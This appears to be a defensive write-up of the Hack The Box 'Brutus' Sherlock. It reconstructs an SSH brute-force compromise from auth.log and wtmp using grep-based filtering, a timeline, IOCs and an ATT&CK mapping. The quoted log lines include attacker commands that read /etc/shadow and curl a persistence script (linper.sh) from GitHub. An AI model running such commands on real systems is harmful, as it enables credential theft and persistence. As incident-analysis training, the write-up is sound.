# 🛡️ Brutus — SOC / DFIR Investigation

> Hack The Box Sherlock focused on Linux authentication logs, SSH brute-force activity, persistence and post-compromise analysis.

---

## 🎯 Objective

The goal of this investigation is to reconstruct a compromise of a Linux server using the evidence provided by the Sherlock.

The analysis focuses on:

- SSH brute-force activity
- Successful authentication
- Session correlation
- Persistence
- Privilege usage
- Credential access
- Tool retrieval
- Timeline reconstruction
- Indicators of Compromise
- MITRE ATT&CK mapping

---

## 📁 Evidence

The challenge provides the following files:

```text
auth.log
wtmp
utmp.py
```

### `auth.log`

Linux authentication log containing events related to:

- SSH authentication
- Failed and successful logins
- Session creation
- User creation
- Password changes
- Group modifications
- `sudo` activity

### `wtmp`

Binary database containing information about interactive login and logout sessions.

The challenge includes the `utmp.py` script to parse this file.

---

# 🔎 Initial Analysis

I started by reviewing `auth.log` manually in chronological order.

This first visual inspection was useful to understand the general sequence of events before applying filters.

An earlier successful SSH login was identified:

```text
Mar  6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22

Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2

Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)

Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
```

At this point, there is not enough evidence to classify `203.101.190.9` as malicious.

Unlike the later attacker IP, no clear brute-force pattern has been identified from this source.

For this reason:

```text
203.101.190.9
Classification: Observed / Unknown
```

This is an important forensic principle:

> A successful login from an external IP is not enough by itself to attribute malicious activity.

---

# 🚨 SSH Brute-Force Activity

At approximately `06:31:31`, the IP address:

```text
65.2.161.68
```

begins generating numerous SSH authentication failures.

Example:

```text
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392

Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): check pass; user unknown

Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68

Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: Invalid user admin from 65.2.161.68 port 46444
```

Several usernames are tested, including:

```text
admin
server_adm
backup
svc_account
root
```

The combination of:

- many authentication failures,
- multiple usernames,
- rapid succession,
- and a single source IP

is consistent with an automated SSH credential attack.

---

## Useful Command — Find Authentication Activity

Instead of relying only on visual inspection:

```bash
grep -E "Invalid user|Failed password|Accepted password" auth.log
```

This provides a quick overview of authentication activity.

---

## Useful Command — Count Failed Attempts by IP

```bash
grep "Failed password" auth.log \
| grep -oP 'from \K[0-9.]+' \
| sort \
| uniq -c \
| sort -nr
```

This makes it easier to identify IP addresses generating unusually large numbers of authentication failures.

---

## Useful Command — Search for Invalid Users

```bash
grep "Invalid user" auth.log
```

To obtain the most frequently attempted usernames:

```bash
grep "Invalid user" auth.log \
| awk '{print $8}' \
| sort \
| uniq -c \
| sort -nr
```

The exact `awk` field may need adjustment depending on the log format.

---

# 🔓 Successful Root Authentication

After the failed attempts, the attacker successfully authenticates as `root`.

```text
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2

Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)

Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
```

A second successful authentication occurs shortly afterwards:

```text
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2

Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)

Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

This strongly suggests that valid credentials for the `root` account were obtained.

---

## Authentication vs Interactive Session

It is important to distinguish between:

```text
Successful authentication
        ↓
Session initialization
        ↓
Interactive terminal session
```

An SSH authentication event does not necessarily mean that an interactive TTY session was created.

This becomes important when correlating `auth.log` with `wtmp`.

---

# 👤 Persistence — Creation of `cyberjunkie`

After obtaining root access, a new local account is created.

```text
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002

Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie

Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002

Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
```

Relevant account information:

```text
Username: cyberjunkie
UID:      1002
GID:      1002
Home:     /home/cyberjunkie
Shell:    /bin/bash
TTY:      /dev/pts/1
```

The value:

```text
from=/dev/pts/1
```

is particularly useful because it links the account creation to an interactive terminal.

---

# 🔑 Password Assignment

A password is assigned to the newly created account:

```text
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
```

Shortly afterwards:

```text
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
```

---

# ⬆️ Privilege Assignment

The attacker then adds `cyberjunkie` to the `sudo` group:

```text
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'

Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```

The sequence is therefore:

```text
Root compromise
      │
      ▼
Create cyberjunkie
      │
      ▼
Assign password
      │
      ▼
Add to sudo
      │
      ▼
Privileged persistence account created
```

This strongly indicates an attempt to establish persistence.

---

## Useful Command — Find Account Modifications

```bash
grep -E "useradd|groupadd|usermod|passwd|chfn" auth.log
```

This is useful when investigating persistence through local account creation or modification.

---

# 🔑 Login Using `cyberjunkie`

The attacker later authenticates using the newly created account:

```text
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2

Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: pam_unix(sshd:session): session opened for user cyberjunkie(uid=1002) by (uid=0)

Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
```

This creates a strong correlation:

```text
Attacker IP
65.2.161.68
      │
      ├── SSH brute-force activity
      │
      ├── successful root login
      │
      └── login as cyberjunkie
```

The same source responsible for the initial brute-force attack is now using the newly created account.

---

# 🔐 Access to `/etc/shadow`

The account then executes a privileged command:

```text
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow

Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
```

This event provides several useful pieces of evidence:

```text
User:       cyberjunkie
TTY:        pts/1
Directory:  /home/cyberjunkie
Privilege:  root
Command:    /usr/bin/cat /etc/shadow
```

The attacker accessed:

```text
/etc/shadow
```

which contains local account password hashes.

---

## Useful Command — Find Privileged Commands

```bash
grep "sudo:" auth.log
```

To focus specifically on the attacker-created account:

```bash
grep "sudo:" auth.log | grep "cyberjunkie"
```

---

# 📥 Retrieval of `linper.sh`

Later, another privileged command is executed:

```text
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)

Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
```

The attacker uses:

```text
/usr/bin/curl
```

to retrieve:

```text
https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

The command was executed from:

```text
PWD=/home/cyberjunkie
```

---

## ⚠️ Evidence Handling Note

The available log proves:

```text
PWD=/home/cyberjunkie
```

and:

```text
curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

However, the command does not show:

```text
-o
-O
>
```

Therefore, from `auth.log` alone it cannot be stated with certainty that the script was saved as:

```text
/home/cyberjunkie/linper.sh
```

A more accurate conclusion is:

> The attacker used `curl` from `/home/cyberjunkie` to retrieve the contents of `linper.sh`.

This distinction is important in DFIR:

> Conclusions should describe what the evidence proves, not what is merely assumed.

---

# 🕒 `wtmp` Analysis

The provided `utmp.py` script was used to inspect `wtmp`.

Relevant entries include:

```text
"USER"  "2549"  "pts/1" "ts/1"  "root"  "65.2.161.68"  "0"  "0"  "0"  "2024/03/06 01:32:45"  "387923"  "65.2.161.68"

"DEAD"  "2491"  "pts/1" ""      ""      ""             "0"  "0"  "0"  "2024/03/06 01:37:24"  "590579"  "0.0.0.0"

"USER"  "2667"  "pts/1" "ts/1"  "cyberjunkie"  "65.2.161.68"  "0"  "0"  "0"  "2024/03/06 01:37:35"  "475575"  "65.2.161.68"
```

---

# 🕓 Incident Timeline

| Time | Source | User | Activity |
|---|---|---|---|
| 06:19:54 | `203.101.190.9` | root | Earlier successful SSH login; not currently attributed to attacker |
| 06:31:31 | `65.2.161.68` | multiple | SSH credential attack begins |
| 06:31:40 | `65.2.161.68` | root | Successful root authentication |
| 06:32:44 | `65.2.161.68` | root | Second successful root authentication |
| ~06:32:45 | `65.2.161.68` | root | Interactive `pts/1` session recorded |
| 06:34:18 | Local | root | `cyberjunkie` group created |
| 06:34:18 | Local | root | `cyberjunkie` user created |
| 06:34:26 | Local | root | Password assigned to `cyberjunkie` |
| 06:34:31 | Local | root | User information modified |
| 06:35:15 | Local | root | `cyberjunkie` added to `sudo` |
| ~06:37:24 | Local | root | Root `pts/1` session terminates |
| 06:37:34 | `65.2.161.68` | cyberjunkie | Successful authentication using persistence account |
| ~06:37:35 | `65.2.161.68` | cyberjunkie | Interactive session recorded in `wtmp` |
| 06:37:57 | Local | cyberjunkie → root | `/etc/shadow` accessed |
| 06:39:38 | Local | cyberjunkie → root | `linper.sh` retrieved using `curl` |

---

# 🚩 Indicators of Compromise

## High-Confidence Attacker IP

```text
65.2.161.68
```

### Evidence

- Numerous SSH authentication failures
- Multiple usernames attempted
- Successful authentication as `root`
- Authentication using the newly created `cyberjunkie` account

---

## Unauthorized Local Account

```text
cyberjunkie
```

### Evidence

- Created after compromise
- Password assigned
- Added to `sudo`
- Used from attacker IP
- Used to execute privileged commands

---

## Suspicious URL

```text
https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

---

## Suspicious Artifact

```text
linper.sh
```

---

## Sensitive File Accessed

```text
/etc/shadow
```

---

## Observed but Not Confirmed Malicious

```text
203.101.190.9
```

Current classification:

```text
Observed / Unknown
```

A successful root authentication was observed, but the available evidence does not currently justify attributing it to the attacker.

---

# ⚔️ MITRE ATT&CK Mapping

| Activity | Technique | ID |
|---|---|---|
| SSH credential attack | Brute Force | `T1110` |
| Successful use of root credentials | Valid Accounts | `T1078` |
| Creation of `cyberjunkie` | Create Account: Local Account | `T1136.001` |
| Addition to privileged group | Account Manipulation | `T1098` |
| Access to `/etc/shadow` | OS Credential Dumping | `T1003` |
| Retrieval using `curl` | Ingress Tool Transfer | `T1105` |

---

# 🛠️ Investigation Improvements

The initial manual inspection was useful for understanding the incident.

However, a real SOC investigation should also use reproducible searches.

A good workflow is:

```text
Manual review
      │
      ▼
Identify suspicious behavior
      │
      ▼
Create hypothesis
      │
      ▼
Filter relevant events
      │
      ▼
Correlate evidence
      │
      ▼
Validate hypothesis
      │
      ▼
Build timeline
```

---

## Follow the Attacker IP

Once `65.2.161.68` was identified:

```bash
grep "65.2.161.68" auth.log
```

With line numbers:

```bash
grep -n "65.2.161.68" auth.log
```

This makes it easier to find surrounding activity.

---

## Examine Context Around an Event

Instead of looking only at the matching line:

```bash
grep -B 5 -A 10 "Accepted password for root from 65.2.161.68" auth.log
```

This displays:

```text
5 lines before
matching event
10 lines after
```

This can reveal actions directly associated with the authentication event.

---

## Search Successful SSH Authentication

```bash
grep "Accepted password" auth.log
```

Useful fields include:

- username
- source IP
- source port
- timestamp

---

## Search Failed Authentication

```bash
grep -E "Failed password|Invalid user" auth.log
```

---

## Search Session Activity

```bash
grep -E "session opened|session closed" auth.log
```

This can help distinguish authentication events from actual sessions.

---

## Search Account Changes

```bash
grep -E "useradd|groupadd|usermod|passwd|chfn" auth.log
```

Useful for detecting:

- persistence
- new accounts
- password changes
- privilege assignments

---

## Search Sudo Activity

```bash
grep "sudo:" auth.log
```

Or specifically:

```bash
grep "sudo:" auth.log | grep "cyberjunkie"
```

---

# 🧠 Investigation Methodology


For Brutus, the attack chain becomes:

```text
SSH authentication failures
            │
            ▼
Multiple usernames attempted
            │
            ▼
Successful root authentication
            │
            ▼
Interactive SSH session
            │
            ▼
Create cyberjunkie
            │
            ▼
Assign password
            │
            ▼
Add cyberjunkie to sudo
            │
            ▼
Login using cyberjunkie
            │
            ▼
Read /etc/shadow
            │
            ▼
Retrieve linper.sh
```

---

# 💡 Lessons Learned

## 1. Do Not Attribute Without Evidence

This event:

```text
Accepted password for root from 203.101.190.9
```

is interesting, but does not automatically mean:

```text
203.101.190.9 = attacker
```

A SOC analyst should maintain different confidence levels.

For example:

```text
Confirmed malicious
High-confidence suspicious
Potentially suspicious
Observed / Unknown
Known legitimate
```

---

## 2. Authentication Is Not the Same as an Interactive Session

Different artifacts describe different stages.

```text
auth.log
→ authentication and PAM activity

wtmp
→ interactive login/logout sessions
```

Correlating both provides stronger evidence than using either one alone.

---

## 3. Correlate Multiple Events

The most convincing evidence is not one individual log entry.

It is the correlation:

```text
65.2.161.68
     │
     ├── repeated authentication failures
     │
     ├── successful root authentication
     │
     ├── interactive session
     │
     └── later login as cyberjunkie
```

---

## 4. Separate Evidence From Assumptions

Evidence shows:

```text
PWD=/home/cyberjunkie
curl https://.../linper.sh
```

It does not necessarily prove:

```text
/home/cyberjunkie/linper.sh
```

was written to disk.

A forensic report should clearly distinguish:

```text
Observed fact
        vs
Analyst inference
```

---

# ✅ Conclusion

The available evidence strongly indicates that the host was compromised through an SSH credential attack originating from:

```text
65.2.161.68
```

After multiple failed authentication attempts against several usernames, the attacker successfully authenticated as:

```text
root
```

After obtaining privileged access, the attacker:

1. Established an interactive SSH session.
2. Created the local user `cyberjunkie`.
3. Assigned a password to the account.
4. Added `cyberjunkie` to the `sudo` group.
5. Logged into the server using the newly created account.
6. Used `sudo` to access `/etc/shadow`.
7. Used `curl` to retrieve `linper.sh`.

The creation of the privileged `cyberjunkie` account represents a persistence mechanism that allows the attacker to retain access independently of the originally compromised `root` credentials.

The investigation demonstrates the importance of correlating:

```text
auth.log
   +
wtmp
   +
account activity
   +
privileged commands
   +
timeline analysis
```

to reconstruct an incident with higher confidence.

---

# 📚 Skills Practiced

![Linux](https://img.shields.io/badge/Linux-Log%20Analysis-blue)
![SSH](https://img.shields.io/badge/SSH-Authentication-blue)
![DFIR](https://img.shields.io/badge/DFIR-Investigation-blue)
![SOC](https://img.shields.io/badge/SOC-Incident%20Analysis-blue)
![MITRE](https://img.shields.io/badge/MITRE-ATT%26CK-red)

- Linux authentication log analysis
- SSH incident investigation
- Brute-force detection
- Account persistence analysis
- Privileged activity analysis
- Timeline reconstruction
- Multi-source log correlation
- IOC identification
- MITRE ATT&CK mapping
- Evidence-based reporting
- Linux CLI log filtering

---

## 🧰 Tools Used

```text
grep
awk
sort
uniq
sed
utmp.py
Linux CLI
```
